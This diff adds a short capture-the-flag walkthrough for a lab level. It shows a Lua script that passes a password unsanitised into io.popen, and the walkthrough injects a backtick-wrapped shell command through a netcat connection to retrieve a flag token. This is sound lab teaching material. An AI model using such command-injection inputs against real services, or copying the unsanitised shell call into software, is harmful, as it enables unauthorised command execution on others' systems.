@@ -1,0 +1,18 @@
+Here, we have a file called level11.lua
+
+If we look at what's inside, we'll see mutiple interesting lines:
+socket.bind("127.0.0.1", 5151)
+io.popen("echo "..pass.." | sha1sum", "r")
+
+Here, we don't care about the others things of this file, because we don't want it to work, but we want to get the flag thanks to a security hole, and we have one here.
+
+If we try to access the adress gived by the lua file:
+nc 127.0.0.1 5151
+It will require us a password.
+
+The passworld will be use in io.popen("echo "..pass.." | sha1sum", "r") and will replace pass.
+So, we can sent it a command to execute insteed of a password, sending something like this:
+`getflag > /tmp/whatever`
+
+After that, we can cat /tmp/whatever to get the flag:
+Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
